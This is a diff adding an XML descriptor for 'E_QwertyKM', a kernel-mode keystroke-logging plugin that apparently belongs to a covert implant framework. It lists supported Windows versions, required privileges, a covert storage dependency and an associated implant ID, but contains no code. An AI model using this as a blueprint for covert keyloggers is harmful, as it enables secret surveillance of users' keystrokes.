@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="../XSLT/pluginHTML.xsl"?>
+<plugin id="20123" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="../XSD/pluginDetails.xsd">
+	<name>E_QwertyKM</name>
+	<projectpath>plugin/Collection</projectpath>
+	<pluginname>E_QwertyKM</pluginname>
+	<shortDescription>Keystroke Collector</shortDescription>
+	<description>
+		This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>
+	<version>
+		<majorType>1</majorType>
+		<minorType>0</minorType>
+	</version>
+	<commands/>
+	<poc>Erebus</poc>
+	<comments>
+		<team>None</team>
+		<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64 bit)</platforms>
+		<rightsRequired>System or Administrator (if Administrator, I think the DriverInstallationUtility will generate some logs)</rightsRequired>
+		<files>None</files>
+		<dllDepend>None</dllDepend>
+		<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>
+		<librariesDepend>CNELib v2.10, WzowskiLib v2.1</librariesDepend>
+		<associatedImplantId>20121</associatedImplantId>
+	</comments>
+</plugin>
